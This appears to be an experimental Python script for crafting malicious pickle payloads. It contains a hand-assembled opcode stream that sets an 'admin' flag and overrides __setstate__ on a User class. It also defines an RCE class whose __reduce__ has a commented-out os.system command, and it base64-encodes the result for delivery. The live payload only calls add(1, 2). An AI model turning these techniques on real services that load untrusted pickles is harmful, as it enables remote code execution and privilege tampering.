import pickle
import pickletools
import base64
import os
from pdb import set_trace
from pickle import PROTO, GLOBAL, NONE, MARK, UNICODE, NEWTRUE, DICT, TUPLE2, BUILD, EMPTY_TUPLE, REDUCE, NEWFALSE, POP, STOP

class User:
  def __init__(self):
    pass 

code = PROTO + b'\x04' + \
  GLOBAL + b'__main__\nUser\n' + \
  NONE + \
  MARK + \
    UNICODE + b'admin\n' + \
    NEWTRUE + \
    DICT + \
  TUPLE2 + BUILD + \
  EMPTY_TUPLE + REDUCE + \
  MARK + \
    UNICODE + b'admin\n' + \
    NEWFALSE + \
    DICT + \
  BUILD + \
  GLOBAL + b'__main__\nUser\n' + \
  NONE + \
  MARK + \
    UNICODE + b'__setstate__\n' + \
    GLOBAL + b'__main__\nUser\n' + \
    DICT + \
  TUPLE2 + BUILD + \
  POP + \
  STOP

def add(a, b):
    return a + b

class RCE:
  def __reduce__(self):
    #return os.system, ('ls -la',) # or whatever command here
    return add, (1, 2,)

class Foo:
  def __init__(self):
    self.x = 1

  def __setstate__(self):
    self.x = 2

if __name__ == '__main__':
    set_trace()
    
    aa = pickle._loads(code)

    set_trace()
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
